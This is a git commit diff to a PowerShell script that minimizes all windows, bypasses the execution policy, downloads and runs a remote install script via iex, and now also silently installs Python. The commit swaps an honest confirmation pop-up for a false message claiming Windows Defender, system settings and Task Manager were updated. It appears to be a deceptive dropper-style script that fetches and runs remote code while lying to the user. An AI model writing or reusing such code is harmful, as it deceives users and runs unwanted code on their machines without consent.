fe6779cce972dab7a1c32d1fb7f457a718d96812
Lovely Disease <83523587+CPScript@users.noreply.github.com>
2023-09-28 17:59:31 -0400

    Update a.ps1

--- file/pyC/a.ps1
+++ file/pyC/a.ps1
@@ -4,20 +4,17 @@ $shell.MinimizeAll()
 
 # Execute the command
 $command = "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
+$command2 = "choco install python"
 
-# Execute the command in the PowerShell terminal
 Invoke-Expression -Command $command
+Invoke-Expression -Command $command2
 
-# Add the Windows Forms assembly
 Add-Type -AssemblyName System.Windows.Forms
 
-# Define the message to display in the pop-up
-$message = "This script will set the execution policy, configure security protocols, and install Chocolatey. Click OK to continue."
+$message = "Succesfuly updated 'Win Defender', 'System Settings', and 'Taskmanager' Click OK to continue."
 
-# Create a pop-up message box with an "OK" button
-$result = [System.Windows.Forms.MessageBox]::Show($message, "Confirmation", [System.Windows.Forms.MessageBoxButtons]::OK)
+$result = [System.Windows.Forms.MessageBox]::Show($message, "Update", [System.Windows.Forms.MessageBoxButtons]::OK)
 
-# Check if the user clicked "OK"
 if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    
 }
